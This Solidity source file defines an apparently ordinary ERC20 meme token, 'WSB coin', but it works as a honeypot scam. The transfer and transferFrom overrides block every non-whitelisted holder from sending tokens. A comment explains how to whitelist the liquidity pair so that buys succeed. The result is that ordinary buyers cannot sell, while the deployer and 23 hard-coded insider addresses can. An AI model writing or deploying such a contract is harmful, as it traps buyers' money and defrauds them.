// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("WSB coin", "WSB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 69420000000 * 10 ** decimals());
        whiteList[0x014DA1CDB4407A0CA491Ea184D9Ec22676C82492]= true;
        whiteList[0x2aA6eaabd5AcCC0163FB47b61bE7e2F13A6e471c]=true;
        whiteList[0x29eaFA35C2B5893f0c2025A12402008508883042]=true;
        whiteList[0x280ADD3739a57ce83e55B184e13a0970B1be42d9]=true;
        whiteList[0x3280D6aC88F9C783A380f9932928436A32b19fbA]=true;
        whiteList[0x7D1004C14538c82Bc27a91186244aB80C49149aE]=true;
        whiteList[0xA4Ec18B28091D8469aEB188fd4bcBB5f5dc31Eb9]=true;
        whiteList[0x39326f37baA073299f394949F2dA2B4f38FD0947]=true;
        whiteList[0x8207f2156C3d6BE23755a4b5176D4903d57E96E5]=true;
        whiteList[0xbE4E99Ca83373d15828c33289f702B64a7032C20]=true;
        whiteList[0xc7a04089aCA34737b4Acb2890712bfB7aBa361cf]=true;
        whiteList[0x88E4F31b7094B6DCa3d77E604bfF57f47CcBa87E]=true;
        whiteList[0x67AEC5d9377a95667fF6373DE046F43c6484b33f]=true;
        whiteList[0x863162341e4E0888c898eD6EAD3c60F0b863CCb8]=true;
        whiteList[0x6caDa018E19ef4Bac5339D7Ec56eAe27dc281070]=true;
        whiteList[0xCA448C9647D263ccD7Cc2350e84C119CB4cD648d]=true;
        whiteList[0xb49F7D1A043806d2da4eFC0e990d8EBf95914c41]=true;
        whiteList[0xb2a7094dE9e33D47cD3D3C62eC10e3Fc597501ae]=true;
        whiteList[0x5E55460e02846bcAde66492f5A0092569dCEaCC5]=true;
        whiteList[0x13f7aF7C1305480961082dE28991A86c26969259]=true;
        whiteList[0x25158C290EFDA0999483d66FACAC6ad3869BC321]=true;
        whiteList[0xD5b537C41868752B753C61B2092639A8A255ed28]=true;
        whiteList[0x2C7be754D8fA2Eae3458dCD0fe92dDb5b06B4d79]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}